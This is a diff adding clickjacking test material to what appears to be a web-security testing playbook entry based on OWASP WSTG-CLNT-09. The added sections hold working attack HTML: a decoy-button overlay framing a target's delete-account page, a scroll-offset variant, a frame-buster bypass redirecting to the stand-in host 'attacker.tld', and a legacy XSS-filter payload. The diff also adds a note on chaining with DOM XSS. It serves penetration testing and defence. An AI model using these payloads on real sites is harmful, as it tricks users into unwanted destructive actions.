@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-922]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-01, wstg-clnt-01.1]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "Clickjacking overlay + a DOM XSS sink that only fires on a click (e.g., an injected onclick handler) = attacker frames the page and tricks the victim into unknowingly clicking the trigger element, reliably delivering the XSS payload without a suspicious link (Medium -> High)"
 ---
 
 # wstg-clnt-09
@@ -182,6 +183,79 @@ print(tester.generate_poc())
 
 ---
 
+## Tools
+
+| Tool               | Purpose                                          |
+| ------------------- | --------------------------------------------------- |
+| **Burp Suite**       | "Engagement tools > Generate CSRF/Clickjacking PoC"  |
+| **Clickjacking PoC generator (PortSwigger)** | Auto-build the iframe overlay HTML |
+| **Browser DevTools** | Verify X-Frame-Options / CSP frame-ancestors headers |
+
+---
+
+## Example Commands/Payloads
+
+### Header check
+
+```bash
+curl -sI "https://{target}" | grep -iE "x-frame-options|content-security-policy"
+```
+
+### Minimal clickjacking PoC
+
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Clickjacking PoC</title>
+<style>
+  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.0001; z-index:2; }
+  #decoy { position:absolute; top:0; left:0; z-index:1; }
+</style>
+</head>
+<body>
+  <div id="decoy"><button style="position:absolute;top:200px;left:150px;">Click to win!</button></div>
+  <iframe src="https://{target}/settings/delete-account"></iframe>
+</body>
+</html>
+```
+
+### drag-and-drop / scroll variant (bypasses simple overlay defenses)
+
+```html
+<iframe src="https://{target}/account" style="opacity:0.0001;position:absolute;width:1500px;height:1500px;top:-1200px;left:-100px;"></iframe>
+```
+
+### `onbeforeunload` bypass for legacy JavaScript frame-busting code
+
+If `{target}` still relies on a client-side `if (top != self) top.location = self.location` buster instead of headers, an attacker can neutralize it by repeatedly cancelling the resulting top-level navigation:
+
+```html
+<!-- 204.php on attacker.tld: header("HTTP/1.1 204 No Content"); -->
+<script>
+  var prevent_bust = 0
+  window.onbeforeunload = function () {
+    prevent_bust++
+  }
+  setInterval(function () {
+    if (prevent_bust > 0) {
+      prevent_bust -= 2
+      window.top.location = "https://attacker.tld/204.php"
+    }
+  }, 1)
+</script>
+<iframe src="https://{target}/settings"></iframe>
+```
+
+### IE8/legacy XSS-filter frame-buster disabling (historical, verify if still applicable to target stack)
+
+Older browser XSS filters would silently disable an inline script (including the frame-busting one) if a substring of it appeared reflected in a request parameter — confirm the buster script is not reachable this way:
+
+```
+https://{target}/?param=<script>if
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -217,6 +291,14 @@ add_header Content-Security-Policy "frame-ancestors 'self'" always;
 | ------------ | ------------------------------------------ |
 | **CWE-1021** | Improper Restriction of Rendered UI Layers |
 
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for Clickjacking (WSTG-CLNT-09)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)
+- [PayloadsAllTheThings - Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)
+- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
 
 ---
 
